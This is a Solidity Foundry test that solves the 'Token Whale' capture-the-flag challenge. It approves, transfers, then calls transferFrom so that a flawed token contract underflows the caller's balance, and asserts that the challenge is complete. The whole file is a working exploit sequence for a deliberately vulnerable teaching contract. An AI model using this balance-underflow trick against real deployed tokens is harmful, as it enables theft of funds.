// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "./TokenWhaleChallenge.sol";

contract TokenWhaleChallengeTest is Test {
    TokenWhaleChallenge public tokenWhaleChallenge;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        tokenWhaleChallenge = new TokenWhaleChallenge(alice);
    }

    function testTokenWhale() public {
        emit log_named_uint("token totalSupply", tokenWhaleChallenge.totalSupply());
        emit log_named_uint("alice's token balance", tokenWhaleChallenge.balanceOf(alice));
        emit log_named_uint("bob's token balance", tokenWhaleChallenge.balanceOf(bob));

        vm.startPrank(bob);
        tokenWhaleChallenge.approve(alice, 1);
        vm.stopPrank();

        vm.startPrank(alice);
        tokenWhaleChallenge.transfer(bob, 1000);
        tokenWhaleChallenge.transferFrom(bob, address(0), 1);
        vm.stopPrank();

        emit log_named_uint("token totalSupply", tokenWhaleChallenge.totalSupply());
        emit log_named_uint("alice's token balance", tokenWhaleChallenge.balanceOf(alice));
        emit log_named_uint("bob's token balance", tokenWhaleChallenge.balanceOf(bob));

        assertTrue(tokenWhaleChallenge.isComplete());
    }
}
